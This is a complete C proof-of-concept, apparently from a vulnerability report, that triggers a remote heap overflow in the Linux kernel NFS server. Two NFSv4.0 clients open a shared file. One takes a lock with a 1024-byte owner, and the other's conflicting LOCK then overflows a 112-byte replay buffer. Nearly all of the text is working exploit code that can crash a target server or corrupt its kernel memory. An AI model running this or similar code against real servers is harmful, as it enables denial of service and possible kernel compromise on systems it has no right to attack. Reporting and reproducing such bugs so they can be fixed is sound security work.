Here’s the code to produce such a crashing input

/*

 * NFSD replay cache slab-out-of-bounds write

 *

 * NFSv4.0 LOCK denied response includes the conflicting lock owner.

 * nfsd4_encode_operation() copies the encoded response into a fixed

 * 112-byte replay buffer (rp_ibuf[NFSD4_REPLAY_ISIZE]) with no bounds

 * check. A 1024-byte lock owner produces a 1056-byte response => 944-byte

 * heap overflow.

 *

 * Usage: gcc -o repro repro_min.c && ./repro <host> <port>

 */

#include <stdio.h>

#include <string.h>

#include <unistd.h>

#include <stdlib.h>

#include <stdint.h>

#include <sys/socket.h>

#include <netinet/in.h>

#include <arpa/inet.h>

#include <time.h>

static unsigned char buf[65536], rbuf[65536];

static int pos;

static uint32_t xid = 1;

static void put32(uint32_t v) {

    v = htonl(v);

    memcpy(buf + pos, &v, 4);

    pos += 4;

}

static void put64(uint64_t v) {

    put32((uint32_t)(v >> 32));

    put32((uint32_t)v);

}

static uint32_t get32(int off) {

    uint32_t v;

    memcpy(&v, rbuf + off, 4);

    return ntohl(v);

}

static void put_opaque(const void *data, int len) {

    put32(len);

    memcpy(buf + pos, data, len);

    pos += len;

    while (pos % 4)

        buf[pos++] = 0;

}

static void put_string(const char *s) {

    put_opaque(s, strlen(s));

}

static void rpc_header(uint32_t proc) {

    pos = 0;

    put32(xid++);

    put32(0);       /* CALL */

    put32(2);       /* RPC version */

    put32(100003);  /* NFS program */

    put32(4);       /* NFSv4 */

    put32(proc);

    put32(1);       /* AUTH_SYS */

    int auth_start = pos;

    put32(0);       /* length placeholder */

    put32(time(NULL));

    put_string("x");

    put32(0);       /* uid */

    put32(0);       /* gid */

    put32(0);       /* aux gids count */

    uint32_t auth_len = htonl(pos - auth_start - 4);

    memcpy(buf + auth_start, &auth_len, 4);

    put32(0);       /* AUTH_NONE verifier flavor */

    put32(0);       /* AUTH_NONE verifier length */

}

static int txrx(int sock) {

    uint32_t rm = htonl(0x80000000 | pos);

    if (send(sock, &rm, 4, 0) != 4 || send(sock, buf, pos, 0) != pos)

        return -1;

    if (recv(sock, &rm, 4, MSG_WAITALL) != 4)

        return -1;

    int len = ntohl(rm) & 0x7FFFFFFF;

    return recv(sock, rbuf, len, MSG_WAITALL);

}

/* Skip RPC reply + COMPOUND header, return offset to first op result */

static int skip_reply_header(void) {

    int o = 12;

    if (get32(8) != 0)

        return -1;

    o += 4;

    o += 4 + get32(o); /* verifier */

    if (get32(o) != 0) /* accept_stat */

        return -1;

    o += 4;

    o += 4; /* compound status (may be non-zero for expected errors) */

    int taglen = get32(o);

    o += 4 + ((taglen + 3) & ~3);

    o += 4; /* nops */

    return o;

}

/* Read op status, advance offset past op_type + status */

static uint32_t op_status(int *o) {

    *o += 4;

    uint32_t st = get32(*o);

    *o += 4;

    return st;

}

static int tcp_connect(const char *host, int port) {

    int s = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port =

htons(port) };

    inet_pton(AF_INET, host, &addr.sin_addr);

    if (connect(s, (void *)&addr, sizeof(addr)) < 0) {

        perror("connect");

        return -1;

    }

    return s;

}

static int setclientid(int s, const char *name, uint64_t *cid, uint64_t *cfm) {

    rpc_header(1);

    put_string("");

    put32(0);

    put32(1); /* COMPOUND: 1 op */

    put32(35); /* SETCLIENTID */

    uint32_t verifier[2] = { htonl(getpid()), htonl(time(NULL)) };

    memcpy(buf + pos, verifier, 8);

    pos += 8;

    put_string(name);

    put32(0x40000000);

    put_string("tcp");

    put_string("0.0.0.0.0.0");

    put32(1);

    if (txrx(s) < 0)

        return -1;

    int o = skip_reply_header();

    if (o < 0)

        return -1;

    o += 4;

    if (get32(o) != 0)

        return -1;

    o += 4;

    *cid = ((uint64_t)get32(o) << 32) | get32(o + 4);

    o += 8;

    *cfm = ((uint64_t)get32(o) << 32) | get32(o + 4);

    return 0;

}

static int setclientid_confirm(int s, uint64_t cid, uint64_t cfm) {

    rpc_header(1);

    put_string("");

    put32(0);

    put32(1);

    put32(36); /* SETCLIENTID_CONFIRM */

    put64(cid);

    put64(cfm);

    return txrx(s) < 0 ? -1 : 0;

}

static int open_file(int s, uint64_t cid, const char *owner, int owlen,

                     const char *file, uint32_t sid[4], unsigned char

*fh, int *fhlen) {

    rpc_header(1);

    put_string("");

    put32(0);

    put32(3); /* COMPOUND: 3 ops */

    put32(24); /* PUTROOTFH */

    put32(18); /* OPEN */

    put32(1);  /* seqid */

    put32(3);  /* share_access: READ|WRITE */

    put32(0);  /* share_deny */

    put64(cid);

    put_opaque(owner, owlen);

    put32(0);  /* OPEN4_NOCREATE */

    put32(0);  /* CLAIM_NULL */

    put_string(file);

    put32(10); /* GETFH */

    if (txrx(s) < 0)

        return -1;

    int o = skip_reply_header();

    if (o < 0)

        return -1;

    if (op_status(&o) != 0)

        return -1; /* PUTROOTFH */

    if (op_status(&o) != 0)

        return -1; /* OPEN */

    for (int i = 0; i < 4; i++)

        sid[i] = get32(o + i * 4);

    o += 16; /* stateid */

    o += 20; /* cinfo */

    o += 4;  /* rflags */

    int bc = get32(o);

    o += 4 + bc * 4; /* bitmap */

    o += 4; /* delegation type */

    if (op_status(&o) != 0)

        return -1; /* GETFH */

    *fhlen = get32(o);

    o += 4;

    memcpy(fh, rbuf + o, *fhlen);

    return 0;

}

static int open_confirm(int s, unsigned char *fh, int fhlen, uint32_t sid[4]) {

    rpc_header(1);

    put_string("");

    put32(0);

    put32(2); /* COMPOUND: 2 ops */

    put32(22); /* PUTFH */

    put_opaque(fh, fhlen);

    put32(20); /* OPEN_CONFIRM */

    for (int i = 0; i < 4; i++)

        put32(sid[i]);

    put32(2); /* seqid */

    if (txrx(s) < 0)

        return -1;

    int o = skip_reply_header();

    if (o < 0)

        return -1;

    if (op_status(&o) != 0)

        return -1;

    if (op_status(&o) != 0)

        return -1;

    for (int i = 0; i < 4; i++)

        sid[i] = get32(o + i * 4);

    return 0;

}

static int do_lock(int s, unsigned char *fh, int fhlen, uint32_t open_seqid,

                   uint32_t osid[4], uint64_t cid, const void *owner,

int owlen) {

    rpc_header(1);

    put_string("");

    put32(0);

    put32(2); /* COMPOUND: 2 ops */

    put32(22); /* PUTFH */

    put_opaque(fh, fhlen);

    put32(12); /* LOCK */

    put32(2);  /* WRITE_LT */

    put32(0);  /* reclaim = false */

    put64(0);  /* offset */

    put64(4096); /* length */

    put32(1);  /* new_lock_owner = true */

    put32(open_seqid);

    for (int i = 0; i < 4; i++)

        put32(osid[i]);

    put32(0); /* lock_seqid */

    put64(cid);

    put_opaque(owner, owlen);

    if (txrx(s) < 0)

        return -1;

    int o = skip_reply_header();

    if (o < 0)

        return -1;

    if (op_status(&o) != 0)

        return -1; /* PUTFH */

    return get32(o + 4); /* LOCK status */

}

int main(int argc, char **argv) {

    const char *host = argc > 1 ? argv[1] : "127.0.0.1";

    int port = argc > 2 ? atoi(argv[2]) : 2049;

    unsigned char big_owner[1024];

    memset(big_owner, 'L', sizeof(big_owner));

    unsigned char fh[256];

    int fhlen;

    uint64_t cid_a, cfm_a, cid_b, cfm_b;

    uint32_t sid_a[4], sid_b[4];

    int sa = tcp_connect(host, port);

    int sb = tcp_connect(host, port);

    if (sa < 0 || sb < 0)

        return 1;

    if (setclientid(sa, "A", &cid_a, &cfm_a) < 0)

        return 1;

    if (setclientid_confirm(sa, cid_a, cfm_a) < 0)

        return 1;

    if (setclientid(sb, "B", &cid_b, &cfm_b) < 0)

        return 1;

    if (setclientid_confirm(sb, cid_b, cfm_b) < 0)

        return 1;

    if (open_file(sa, cid_a, "oA", 2, "lockfile", sid_a, fh, &fhlen) < 0)

        return 1;

    if (open_confirm(sa, fh, fhlen, sid_a) < 0)

        return 1;

    if (open_file(sb, cid_b, "oB", 2, "lockfile", sid_b, fh, &fhlen) < 0)

        return 1;

    if (open_confirm(sb, fh, fhlen, sid_b) < 0)

        return 1;

    /* Client A: LOCK with 1024-byte owner */

    int status, seq = 3;

    for (int i = 0; i < 120; i++, seq++) {

        status = do_lock(sa, fh, fhlen, seq, sid_a, cid_a, big_owner, 1024);

        if (status != 10013) /* NFS4ERR_GRACE */

            break;

        sleep(1);

    }

    if (status != 0) {

        fprintf(stderr, "LOCK A failed: %d\n", status);

        return 1;

    }

    printf("LOCK A granted (1024-byte owner)\n");

    /* Client B: conflicting LOCK => NFS4ERR_DENIED => overflow */

    char small_owner[4] = {0, 0, 0, 1};

    status = do_lock(sb, fh, fhlen, 3, sid_b, cid_b, small_owner, 4);

    printf("LOCK B status: %d %s\n", status,

           status == 10010 ? "(NFS4ERR_DENIED) -- overflow triggered!" : "");

    close(sa);

    close(sb);

    return status == 10010 ? 0 : 1;

}

